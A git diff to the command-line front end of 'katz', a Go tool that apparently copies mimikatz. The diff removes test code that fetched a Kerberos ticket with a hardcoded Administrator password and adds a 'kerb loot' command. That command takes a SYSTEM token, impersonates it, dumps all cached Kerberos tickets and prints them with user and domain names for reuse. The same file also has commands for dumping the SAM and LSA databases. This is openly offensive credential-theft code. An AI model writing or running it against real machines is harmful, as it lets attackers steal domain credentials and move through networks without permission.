@@ -2,13 +2,12 @@ package cli
 
 import (
 	// "encoding/base64"
-	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"strings"
 
 	katz_modules "katz/katz/modules"
-	test "katz/katz/modules/kerb"
+	// test "katz/katz/modules/kerb"
 	katz_utils "katz/katz/utils"
 
 	"github.com/spf13/cobra"
@@ -32,23 +31,33 @@ var testCmd = &cobra.Command{
 	Use: "test",
 	Short: "run test code",
 	Run: func (cmd *cobra.Command, args []string)  {
-		tick, _ := test.TGT("test.local", "Administrator", "password")
-		fmt.Println(base64.StdEncoding.EncodeToString(tick))
-		handle,kerberosPackageName, err := test.KerberosInit()
-		fmt.Println(handle)
-		fmt.Println(kerberosPackageName)
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		// test.Extract_Tick(handle, kerberosPackageName, "krbtgt/TEST.LOCAL")
-		// tick, _ := test.TGT("test.local", "Administrator", "password")
 		
-
-		fmt.Println(base64.StdEncoding.EncodeToString(tick[10:]))
+		
 
 	},
 }
+
+var kerberos = &cobra.Command{
+	Use: "kerb",
+	Short: "kerberos tickets",
+}
+var lootTickets = &cobra.Command{
+	Use: "loot",
+	Short: "loot all kerberos tickets",
+	Run: func(cmd *cobra.Command, args []string) {
+		systoken, _  := katz_utils.GetSystem()
+		katz_utils.InjectToken(systoken)
+		tickets := katz_modules.GetKerberosTickets()
+		for _, ticket := range tickets {
+			uname := ticket["username"].(string)
+			domain := ticket["domain"].(string)
+			ticket := ticket["krbCred"].(string)
+			fmt.Println(uname + "@" + domain + "::" + ticket)
+			// fmt.Println(ticket["krbCred"])
+		}
+	},
+}
+
 var lsa = &cobra.Command{
 	Use: "lsa",
 	Short: "do something with the LSA database",
@@ -159,5 +168,8 @@ func Init() {
 	rootCmd.AddCommand(sam)
 	rootCmd.AddCommand(testCmd)
 	rootCmd.AddCommand(lsa)
+	kerberos.AddCommand(lootTickets)
+	rootCmd.AddCommand(kerberos)
+
 	rootCmd.Execute()
 }
